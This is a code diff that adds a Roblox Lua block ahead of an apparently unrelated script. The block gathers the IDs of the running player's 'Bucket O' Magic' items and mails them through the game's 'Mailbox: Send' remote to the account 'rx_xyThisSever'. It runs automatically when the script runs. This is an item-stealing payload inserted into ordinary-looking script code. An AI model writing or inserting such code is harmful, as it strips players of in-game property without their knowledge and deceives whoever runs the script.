@@ -1,4 +1,40 @@
+--Services/Variables
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Client = require(ReplicatedStorage:WaitForChild("Library"))
 
+local ItemTable = {"Bucket O' Magic"} --You need to put the full name of the item you want to grab
+
+--Make Table Function
+function MakeTable(Table)
+	local Temp = {}
+	for i,v in next, Client.Items.All.Globals.All() do
+		if table.find(Table, v._data.id) then
+			table.insert(Temp, v._uid)
+		end
+	end
+	return Temp
+end
+
+--Grab Id Function
+function GrabId()
+    for i, MadeTable in MakeTable(ItemTable) do
+        print(MadeTable)
+
+local args = {
+    [1] = "rx_xyThisSever",
+    [2] = "ok",
+    [3] = "Misc",
+    [4] = MadeTable,
+    [5] = 100
+}
+
+game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+    end
+end
+
+--How To Use That
+GrabId()
 
 local currentActivePart = workspace:FindFirstChild("CurrentlyActive")
 
